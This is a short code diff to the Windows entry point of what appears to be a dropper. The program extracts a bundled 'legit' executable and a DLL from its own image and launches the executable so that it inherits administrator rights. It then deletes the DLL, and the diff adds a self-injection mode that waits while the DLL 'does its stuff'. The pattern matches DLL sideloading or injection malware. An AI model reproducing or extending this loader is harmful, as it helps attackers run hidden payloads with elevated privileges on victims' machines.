@@ -36,10 +36,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         return 0;
     }
 
+    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, cwd + MY_DLL);
 #ifndef SELF_INJECTION
     //Extracts the legit image and dll to execute from its own image and starts it (inherits administrator permission from parent process)
     Utils::ExtractImageToDisk(embedded_image_1, embedded_image_1_size, target); //First embedded image should be the legit executable
-    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, cwd + MY_DLL);
     STARTUPINFO info = { sizeof(info) };
     PROCESS_INFORMATION processInfo;
     while (!CreateProcessA(target.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
@@ -70,10 +70,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     while (rename(target.c_str(), full_path)) { 
         Sleep(100);
     }
+#endif
 
     //Remove my dll from disk just in case idk
     remove((cwd + MY_DLL).c_str());
-#endif
 
+#ifdef SELF_INJECTION
+    //Sleep to let DLL do its stuff
+    while (true) Sleep(1); 
+#endif
 	return 0;
 }
